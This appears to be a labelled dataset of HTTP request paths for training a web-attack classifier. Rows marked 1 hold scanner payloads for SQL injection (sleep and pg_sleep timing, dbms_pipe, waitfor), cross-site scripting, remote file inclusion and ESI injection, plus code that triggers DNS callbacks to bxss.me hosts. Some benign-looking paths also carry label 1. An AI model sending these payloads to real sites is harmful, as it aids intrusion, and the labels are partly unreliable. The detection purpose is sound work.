request	label
/****/bmkx/sswj/201610/t20161025_2480_wap.html	0
/****/zzxxgk/tjj/zfxxgkml_2127/jytabljg_2061/http://bxss.me/t/fit.txt.html	1
/****/web/search?channelid=222832&searchword=\u9752\u94dc\u5ce1\u5e02\u81ea\u8c26\u7efc\u5408\u5546\u5e97	0
/**/ui/lib/easyui//xfs.bxss.me/bootstrap/linkbutton.css	1
/****/nyjx/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user	1
"/****/zzxxgk/tjj/zfxxgkml_2127/xwfbh'""""()&%<acx><script >8m5j(9866)</script>_2065/list.html"	1
/****/web/search?searchword=1&channelid=287219&perpage=24&templet=1') or 6887=6887 /*&token=1	1
/****/lj_46507/yw_1295/202104/t20210419_2784213.html	0
/******/rss/rssfeed.jsp?colid=34) and 1894=(select 1894 from pg_sleep(5)) and (2512=2512	1
/****//xfs.bxss.me/sgaj/201812/t20181208_112298.html	1
/****/20211110/10721.html	0
/******/visitcount/visit.jsp?type=3&i_webid=1&i_columnid=34&i_articleid=224482	0
//***********/xxgkzd/list.html	1
/****/gfxwj/202012/t20201209_2415532.html	0
/****/bmkx/sjcy/201803/t20180328_101907.html	0
/****/zcc/	0
/zwxx_11337/****/202002/t20200203_1939638.html	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u4e2a\u4f53\u7ecf\u8425\u9f99\u817e\u7269\u6d41\u4e2d\u5fc3	0
/zwgk%' and 2*3*8=6*8 and 'lcuv'!='lcuv%/******/bzxajgc/ycs/hlx.htm	1
/***/mobile_h5/waparticledetail.do?article_id=202112151613311131&contenttype=article&undefined=undefined	0
/***/images/xzrq.gif	0
/**********/system/more/206000000000000/0012/206000000000000_00001203.shtml	0
/****/201903/t20190328_206038.html	0
/**********/system/2020/04/23/013147171.shtml	0
/****/202104/t20210406_272212.html	0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u81ea\u4fe1\u5546\u884c	0
"/****/"""" """"a"""".concat(70-3).concat(22*4).concat(100).concat(68).concat(121).concat(76) (require""""socket""""
socket.gethostbyname(""""hitik"""" """"xtzstywy17fd8.bxss.me."""")[3].to_s) """"/lzyj/"	1
/******/system/2010/05/05/010115573.shtml	0
/***/general/diary/new/submit.php	1
/****/js/chunk-e433fc62.0a5c65c0.js	0
"/****/zt/ydyl/\""javascript:void(0)\"""	1
/******/visitcount/visit.jsp?i_columnid=1'and/**/convert(int,sys.fn_sqlvarbasetostr(hashbytes('md5','1291708084')))>'0&i_webid=1&type=1	1
/****/bmkx/sybj/202001/t20200117_146593.html	0
/****/app?adminemail=<script>alert(777)</script>&smtpserver=127.0.0.1&smtpport=25&smtpuser=<script>alert(777)</script>&smtppassword=admin&smtpsecurity=none&proceedbutton=save&operation=config&st=savesmtp	1
/****/xxgkml/qtfdxx/zcjd/szcjd/201911/t20191108_144119.html	0
"/****/cometchat/plugins/handwrite/index.php?id="""">alert(777)"	1
"/****/"""" """"a"""".concat(70-3).concat(22*4).concat(108).concat(87).concat(111).concat(69) (require""""socket""""
socket.gethostbyname(""""hithz"""" """"haxtcwjzce9b5.bxss.me."""")[3].to_s) """"/bmjs/qtdw/"	1
/******/gjcp/gcjx/ywly/jrytz/ddjs/nbfw/ywzzq/xwzx/zdgz/bqsm/	0
/******/visitcount/visit.jsp?i_columnid[0]==2'and/**/convert(int,sys.fn_sqlvarbasetostr(hashbytes('md5','1487378461')))>'0and 3 in &i_columnid[1]=3&i_webid=1&type=1	1
/****/bmkx/sjhj/202112/t20211220_197950_wap.html	0
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtajnx6v0oglpfjx3c08x68y=&openid=ovl7jjmvliavhu7jxbvkenswblwc&outer_str=81553&activate_ticket=fdzv9emqaffrnr3xboqhbza9qr6zu1n6iwal kjxiqrhfifidrt1ejnprxbtx1zvgetfi6tpfanrmsfpbenvtgpcgenfngd8xuvfyd4vvwi=	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u9547\u7f57\u9547\u5218\u5982\u5e73\u997c\u5b50\u9992\u5934\u5e97	0
/*****/system/2012/02/21/javascript:window.close();	1
/****/whs/yw_1286/201702/t20170226_314560.html	0
/****/202011/t20201130_2385582.html	0
/**************/cms/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u73b0\u4ee3\u519c\u4e1a	0
/wp-content/*******/nextgen-gallery/xml/media-rss.php?mode=<script>alert(lyqvkof1)</script>	1
"/****/bmkx/sfgw/201810/"""	0
/******/zz-nxslh-common.js	0
/**********/system/2021/05/18/013386930.shtml	0
/xwdt' and 2*3*8=6*8 and 'axdn'='axdn/****/jzgl/gzdt/1.htm	1
/****/b-e740468.html	0
/***/getsubject?vno=3.5.0°¡tamp=1640035183899&	0
"/****/category/jishuchuangxin?page=*/-->'""""></iframe></script></style></title></textarea><script >alert(02629)</script>"	1
/****/\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd?page=2	0
/****/20200929/8739.html	0
/zwxx_11337/****/202111/t20211103_3113857_zzb.html	0
/****/tzgg/202109/t20210928_3060304.html	0
/**********/system/2020/07/02/013197516.shtml	0
"/****/"" and ""x""=""x"	1
/***/sjk/	0
/*****/system/2021/11/16/javascript:void(0);	1
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u5c31\u5730\u8fc7\u5e74	0
/****/20210902/10396.html	0
/***/003/004/508/00300450893_db894705.jpg	0
/************/template/http://bxss.me/t/fit.txt/110105008056111/16/images/plugin/criteria/css.css	1
"/******/main/myspace/student.php?keyword=31337"""" onmouseover=confirm(777)//&active=0&_qf__search_user=&submit=search"	1
/****/zt/hjbhdc/202112/t20211213_3218796.html	0
/****/netflow/jspui/j_security_check?radiususerenabled=false&authrule_name=authenticator&j_username=admin52f43'><script>alert(777)</script>6f472a19875&j_password=admin	1
"/xxgk<esi:include src=""""http://*******/rpb.png""""/>/zzxxgk/tjj/"	1
/*******/202103/202103230911301012.html	0
/****/zzxxgk/sfaju/xxgkzn_3212	0
/****/zt/msss/msxw/202112/t20211213_3217963.html	0
/******/2014qglh/css/1.css	0
/******/_content/download.jsp?urltype=news.downloadattachurl&owner=1707212448' or 1003=1003 and '1'='1&wbfileid=51419	1
/****/xqdt/hnx/201610/t20161025_50941.html	0
/****/jtdt/2020_jtyw/202007/w020200715726122555785.jpg	0
/****/lkw/yw_1292/202112/t20211218_3234437.html	0
/****/system/2021/03/03/javascript:void();	1
/****/system/count/0036001/006000000000/window.location.href	1
/****/web/search?channelid=222832&searchword=\u76d0\u6c60\u53bf\u963f\u7fd4\u5546\u884c	0
/**********/system/2020/10/29/013273675.shtml	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u4fbf\u6c11\u5802\u836f\u5e97	0
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u9686\u6e56\u4e5d\u4e5d\u7ea2\u62c9\u9762	0
/*******/qiye/businesses-e14022.html?category_id=120716	0
/****/zzxxgk/tjj/zfxxgkml_2127/lzyj/bmwj/list.html?new=/xfs.bxss.me	1
/*******/202104/202104181345001012.html	0
/*****/search.asp?field=my_baizi&classid=&keyword=\u00c8\u00d6\u00d2\u00e3	0
/**********/system/2020/02/27/013097133.shtml	0
/**********/system/2021/12/18/013496258.shtml	0
/****/20201231/e113378304.html	0
/****/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/gcjsbzgl/gcjybz.htm	1
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u8fa3\u77e9\u9635\u9ebb\u8fa3\u70eb\u5e97	0
/****/bmkx/swjw/202001/t20200110_146342.html	0
/****/system/2014/11/06/011548102.shtml	0
/***********/rdandmanufacture/201412/t20141210_22173.html	0
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtpuhd6utnrmlajytgvtlnty=&openid=ovl7jjpuyz2w_j-njq2cpua9g7l4&outer_str=73122&activate_ticket=fdzv9emqaffrnr3xboqhb/9jbhb3nz9tjibaq7plj8doo8dbj5 fzedtzplsmcarxvioeup9q6wjeq/7lecrlqi8knncwkhmzjiykedct38=	0
/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/****/25187.htm	1
/******//966/9uakjzq8/xhr_send?t=1629433785962	1
/*******/qiye/b-e2353777.html	0
/****/pglkcg-hynews-e114432598.html	0
/**/system/2021/11/08/012217447.shtml	0
"/**/ui/widgets/hanweb/iconfont/css/iconfont"""" and 2*3*8=6*8 and """"oofy""""=""""oofy.css"	1
/****/xxgk/rsxcsx/qtyz/ywzzq/nbfw/xwzx/gzdt/gjcp/dxzdj/rlzy/	0
/****************/notification/negotiate?access_token=5db38f40-e083-4205-b125-1e0e4895052c	0
/******/system/2016/05/17/javascript:window.print()	1
/**********/system/2021/10/28/013471635.shtml	0
/***/businesstripapply/getjkqk?cpersonid=00000429&page=1&limit=10	0
/***/com/menu/images/t5-left.jpg	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u60e0\u98ce\u548c\u7545\u5e7f\u544a\u90e8	0
/******/resource/code/datainput.jsp?owner=%') and 9529=0875	1
"/****/index.cfm?field="""">alert(777)"	1
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u671b\u8fdc\u9547\u56db\u5b63\u9ebb\u8fa3\u70eb\u917f\u76ae\u5e97	0
/****/web/search?channelid=299868&perpage=1000%' or 6723=6723 and '%'='	1
/****/czgk/bmjs/sydw1/zzqskylgbjdaj_1820/index_1.html	0
/***/img/1024[1].bmp	0
/****/xydt/2015_hydt/index_8.html	0
/**********/system/2021/04/01/013361142.shtml	0
"/*/public/viewclick/?addclick=1&classid=0""""xor(if(now()=sysdate(),sleep(3),0))xor""""z&id=8975"	1
/*******/state/service/166/exec	1
"/***/?refresh="";window.top._web_js_namespace_taint_tracer.log_execution_flow_sink()""//"	1
/****/bmkx/sjhj/201610/t20161025_875.html	0
/******/zencart1.php	0
/zwxx_11337/****/ytdd/202111/w020211130562177249846.jpg	0
/zwxx_11337/****/201807/t20180710_895025.html	0
/****/web/search?page=188&channelid=222832&searchword=\u54b8\u8f89&keyword=\u54b8\u8f89&perpage=20&outlinepage=10	0
/***/0/01/93/12/1931240_779631.jpg	0
/****/web/search?page=2&channelid=253477&searchword=1&keyword=1&orderby=-docreltime&perpage=15%') and 1=dbms_pipe.receive_message(chr(90)||chr(80)||chr(71)||chr(74),0)-- &outlinepage=10	1
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u8001\u8c2d\u9910\u5385	0
/**********/system/2021/11/05/013475996.shtml	0
/*******/zwgk/czgk/bmjs/zzqdwyzfpcjgyzsjgyzssydw/zzqnky/	0
/****/zydkyw	0
/****/zfwjn/1088/1103/list.html?new='.gethostbyname(lc('hitse'.'ropwzcqkd19b5.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(113).chr(82).chr(99).chr(79).'	1
/******/usercenter/index?qrcode=quicklyrq,3,150674,55929	0
/****/zzxxgk/http://bxss.me/t/fit.txt?.jpg/	1
/**********/system/2021/04/06/013363247.shtml	0
/*******//804/jtusqvy5/xhr_send?t=1632409588676	1
/**********/system/2020/07/04/013198506.shtml	0
/_vsl/********************************/2435d76b/d1c6	0
/*****/system/2019/08/19/javascript:void(0);	1
/**********/system/2021/12/16/013495230.shtml	0
/***/getallchannels?vno=3.5.0'and/**/extractvalue(1,concat(char(126),md5(1295595714)))and'	1
/****/qzfwj/201801/t20180115_668722.html	0
"/'""""()&%<acx><script >dgy2(9664)</script>/********/:alias"	1
/****/zt/tpgj_1542/gzdt/202011/t20201119_2342807.html	0
/****/lj/yw_1295/202106/t20210617_2889345.html	0
"/****/fiyo/?app=article&view=item31ab2"""">alert(777)0ccba&id=186"	1
/**********/system/2020/08/31/013236926.shtml	0
/**********/system/more/212000000000000/0024/212000000000000_00002489.shtml	0
/*****/system/2015/08/23/011800114.shtml	0
/***/0/10/07/22/10072222_873931.jpg	0
/*******/qiye/b-e2053621.html	0
/***/0/02/12/41/2124111_096146.jpg	0
/******/jslib/ckplayer/http://bxss.me/t/fit.txt.js	1
"/*******/index?review_id=&statuses[]=open&statuses[]=reopened&severities[]=&projects[]=&author_login=&assignee_login="""">alert(/777/)&false_positives=without&sort=&asc=false&commit=search"	1
/*******/xxgknb/2012/list.html	1
/******/resource/code/datainput.jsp?owner=1329914701&e=1&w=1440&h=900&treeid=1099&refer=ahr0cdovl3d3dy5uegpzy3guy29tlmnul2djc2ouahrt&pagename=l3njehdfbglzdc5qc3a=&newsid=-1	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u9655\u8bb0\u8089\u5939\u998d\u9910\u5385	0
/***/0/00/08/23/82310_963107.jpg	0
/****/20210927/10507.html	0
/****/xxgknb/2013/list%' and 2*3*8=6*8 and 'ykuk'!='ykuk%.html	1
/*******/ilj0.php	1
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u5218\u660e\u4e16\u7eaa\u9970\u54c1\u5e97	0
/****/bmkx/sybj/202011/t20201102_173610.html	0
/*******/201905/201905200913071016.html	0
/****/sj1/jjzs/202108/t20210823_http://bxss.me/t/fit.txt.html	1
/****/czgk/bmjs/zzqjcyxt/xxqrmjcy/201908/t20190808_1655613.html	0
/zwxx_11337/****/index_17.html	0
/******/usercenter/index?qrcode=83939&code=031njo100z721n1fam100ifzcs3njo1u	0
/******/system/2021/11/28/013486922.shtml	0
/*********/web/viewer.html?file=/uploadimg/gqtb/2019063pdf' and 1327=3113 and 'veqz'='veqz	1
/****/zjdt'||'/jsgcxfjg/gzdt.htm	1
/****/czgk/bmjs/zzqdwyzfpcjgyzsjgyzssydw/zzqlsj/	0
"/************/'""""()&%<acx><script >cac6(9511)</script>/jcse/110105008056111/16/images/view.js"	1
/****/web/search?channelid=222832&searchword=\u98df\u54c1\u5b89\u5168	0
/****/web/search?page=2&channelid=253477&searchword=1&keyword=1' and 9381=3835 and '1'='1&orderby=-docreltime&perpage=15&outlinepage=10	1
/****/form.jspx?id=1060&channelid=</script><script>window.top._web_js_namespace_taint_tracer.log_execution_flow_sink()</script>	1
/*******/dzdn.php	1
/**/ourbusiness/rdandmanufacture/201412/	1
"/**/abantecart/index.php?rt=""><script>alert(777);</script>&s=your_admin""><script>alert(777);</script>&token=957bf7cb71078f4471807da1c42d721e""><script>alert(777);</script>"	1
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u9ec4\u94ce\u5821\u9547\u6d77\u971e\u5bb6\u5ead\u7267\u573a	0
/****/web/search?channelid=222832&searchword=\u9686\u5fb7\u53bf\u7f57\u5c0f\u4eae\u767e\u8d27\u5e97	0
/***********/jinrongqihuo/guzhiqihuo'||'/index_9.html	1
/*********/treasury/index.aspx?nodeid=394' and 2294=dbms_pipe.receive_message(chr(103)||chr(110)||chr(122)||chr(85),5) and 'wojy'='wojy	1
/zwgk%' and 2*3*8=6*8 and '2mbs'!='2mbs%/*****/gcjsbz_sjbz/1.htm	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u6c11\u7231\u5065\u5eb7\u751f\u6d3b\u9986	0
/***/0/02/10/88/2108875_731599.jpg	0
/****/admin/dash_status.php?status_data[1]=alert(777);	1
/**********/system/2021/09/06/013446936.shtml	0
/*****/frontcontroller?domainname=<script>alert(77729</script>&operation=160	1
/****/gjmt/xmt/201501/t20150106_51364.html	0
/****/lzqh/jtdt/202112/t20211206_322811.html	0
/**********/system/2021/08/14/013434795.shtml	0
/****/state/service/166/exec	1
/investors-garden/***/	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u519b\u5174\u5b9d\u725b\u7f8a\u8089\u5e97	0
/zwxx_11337/****/201906/t20190614_1551257.html	0
/***/rlzy/rcgk/bqsm/lxwm/nbfw/gjcp/fzjx/ddjs/jjgz/qywh/whhd/	0
/****/uvf0ss-hynews-e110671356.html	0
"/************/interfaces/dimension.do?begin=20201023&end=20211023&eq=1&oq=0""""xor(if(now()=sysdate(),sleep(15),0))xor""""z&p=1&pg=1&pos=filenumber&pq=&q=«Î ‰»Îπÿº¸¥ &searchid=44&tpl=16&websiteid=110105008056111"	1
/**********/system/2020/05/11/013159147.shtml	0
/****/zzxxgk/jjhzj/gyjzq/jyx_3665/201907/t20190710_166027.html	0
/zwxx_11337/****/201405/t20140519_310060.html	0
"/****/category/silujiaoyu?page=1'""()&%<acu><script>9112(9131)</script>"	1
/***/003/003/007/00300300729_b991b8c8.jpg	0
/****/czgk/bmyjs/zzqjcyxt/plxrmjcy/202103/t20210309_2620071.html	0
"/****/cgi-bin/module/sharedobjmanager/policy_new/874/policytable?vdom=""'/></script><script>alert(777)</script>"	1
/****/xqdt/hnx/201610/t20161025_50927.html	0
/*****/admin/index.php?step=admin_member_display&search_field=all&keyword=<script>alert(777)</script>&cmd_button=search user	1
/zwxx_11337/***/202002/t20200214_1954909.html?from=groupmessage	0
/*****/gy42/cpgyss.asp?key=\u91d1\u5c5e\u9541\u56de\u8f6c\u7a91\u5e94\u7528&l2=\ufffd\ufffd\ufffd\ufffd&l=\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd	0
/****/bwcx/zybs/index_2.html	0
/****/czgk/bmjs/zzqjcyxt/znxrmjcy	0
/***/003/003/331/00300333122_1b5ef1bd.jpg	0
"/****/dorg/results.php?q='""--></style></script><script>alert(777)</script>&search=search&type=3"	1
/****/nur6ci-article-e113077969.html	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u5b8f\u6da6\u519c\u7267\u4e13\u4e1a\u5408\u4f5c\u793e	0
/**********/system/2021/10/09/013461752.shtml	0
"/****/xxgkml/zdmsxx/list.html?new=' 'a'.concat(70-3).concat(22*4).concat(98).concat(65).concat(109).concat(68) (require'socket'
socket.gethostbyname('hitam' 'arwoczfefeb5e.bxss.me.')[3].to_s) '"	1
/****/xh/hy/201701/t20170122_313713.html	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u6b66\u5168\u8d27\u8fd0\u90e8	0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u957f\u5c71\u5934\u8363\u4e61\u56ed\u9910\u5385	0
/**********/system/2020/05/16/013162979.shtml	0
/**********/system/2016/05/24/012012561.shtml	0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u5fc6\u9999\u574a\u9762\u9986	0
/***/mobile_h5/waparticledetail.do?article_id=201902251859171421&contenttype=article	0
/***/ggfw/images2/flash7.gif	0
/****/qyzz/zjzj/	1
/****/jypx/201412/w020141204413820772595.jpg	0
/****/sj1/tjsj/202003/t20200323_1998748.html	0
/***/0/11/42/31/11423193_676061.jpg	0
/****/5mm0tm-article-e114910010.html	0
/******/visitcount/visit.jsp?i_articleid=242398&i_columnid=0'xor(if(now()=sysdate(),sleep(15),0))xor'z&i_webid=1&type=3	1
/****/web/search?channelid=222832&searchword=\u6d77\u539f\u53bf\u6d77\u57ce\u9547\u9a6c\u5c0f\u5170\u5316\u5986\u54c1\u5e97	0
"/*/201020'""""()&%<acx><script >ejwv(9573)</script>-1/videos-detail/4e8c38de2e5ef1a81f429ac1992d4cf2.css"	1
/****/wdszs/hfsz/202005/t20200522_166828.html	0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u6768\u548c\u9547\u591c\u90e8\u843d\u9152\u5427	0
/****/qzfwj/202103/t20210316_2628398.html	0
"/************/search.do?begin=20201012&end=20211012&eq=1&oq=1&p=1&pg=1&pos=filenumber&q=«Î ‰»Îπÿº¸¥ &searchid=44'""""()&%<acx><script >6qjr(9552)</script>&tpl=16&websiteid="	1
/****************/notification?access_token=603af9de-ada8-47e7-a9d9-e21c3326e8c8&id=undefined	0
/**********/system/2021/12/16/013495154.shtml	0
/***/mobile_h5/waparticledetail.do?article_id=202112201650561102&contenttype=article	0
/****/czgk/bmjs/zzqjcyxt/xjxrmjcy/	0
"/****/"""".gethostbyname(lc(""""hitst"""".""""zukjjbcy15a88.bxss.me."""")).""""a"""".chr(67).chr(hex(""""58"""")).chr(114).chr(73).chr(97).chr(83).""""/tjj/"	1
/**/general/diary/new/submit.php	1
/*****/gy48/cpgyss.asp?key=\u5851\u6599\u914d\u4ef6\ufffd?&l=\ufffd\ufffd\ufffd\ufffd	0
/****/zdlygk/ncwywfgz/ycs%' and 2*3*8=6*8 and 'kibn'!='kibn%/lws/xmb_gzdxb.htm	1
/**********/dj	0
/********/ddjs/wzdt/ywly/rlzy/rcln/gjcp/nyjx/	0
/***/interface/comul_total.json.jsp?callback=jquery17108632315764994793_1639991175361	0
/**********/system/2020/04/27/013150234.shtml	0
/****/czgk/bmyjs/zzqfyxt/zzqgyzzqtlfy/201802/t20180223_693305.html	0
/****/jtdt/2021_jtyw/202101/t20210126_269728.html	0
/******/system/2021/04/23/013374359.shtml	0
/**/system/2021/05/14/012160611.shtml	0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u6cb3\u5317	0
/***/blockdata/articlelist_4g3.do?channelarticlelist_4g3_channelid_ss=channelid&channelid=sifa°Ëtpage=19&query=java	0
/zwxx_11337/****/202003/t20200320_1997453.html	0
/*******/qiye/e142850441.html	0
/**/system/2021/11/19/javascript:void(0);	1
"/******/resource/js/0""""xor(if(now()=sysdate(),sleep(12),0))xor""""z/calendar.js"	1
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u5b81\u4e1c\u9a6c\u94f6\u5bbe\u6c7d\u8f66\u4fee\u7406\u90e8	0
/******/usercenter/index?qrcode=scanqrcode&code=071rya0008yczm1fdr300nxbqa3rya0c	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u90d1\u658c\u517b\u6b96\u573a	0
/**/sustainability/csrreports/201902/t20190211_203689.html	0
/**/ui/if(now()=sysdate(),sleep(15),0)/easyui/plugins/jquery.linkbutton.js	1
/**********/system/2021/12/20/013496881.shtml	0
"/************/template/jcse/110105008056111/16/images/plugin/waterpull/"""" """"a"""".concat(70-3).concat(22*4).concat(105).concat(81).concat(122).concat(78) (require""""socket""""
socket.gethostbyname(""""hitvz"""" """"azwjjbgi772ce.bxss.me."""")[3].to_s) """".js"	1
/**********/system/2020/06/26/013193246.shtml	0
/**********/system/2021/08/18/013436259.shtml	0
/***/minip/yimiao/grzx-sel.png	0
/about-southwest/******/2021-12-13/11079.html	0
/****/system/2021/11/16/javascript:window.close();	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u4e2a\u4f53\u7ecf\u8425\u7ea2\u7533\u6536\u8d2d\u7ad9	0
/****/xqldly/hfbyqz/202007/t20200727_169814.html	0
/******/jl_serachleft.png	0
/****/wdsjs/hfswsj/201912/t20191219_145683_wap.html	0
/*******/y2qqgac.php	1
/****/web/images/jl_resultsearch2.png	0
/******/public/2021/11/22/110577.images/v110577_b1637546470003_app.jpg	0
/****/qzfwj/list_1'; waitfor delay '0:0:2.html	1
/*****/search.asp?field=my_baizi&classid=&keyword=\ufffd\ufffd\u02b8\ufffd\ufffd\u04bb	0
"/************/template/jcse/110105008056111'""""()&%<acx><script >m5zd(9500)</script>/16/images/css.js"	1
/****/bmkx/swjw/201903/w020190306320808932804.jpg	0
/***********/zaojianpinglun/?_=1639991384349	0
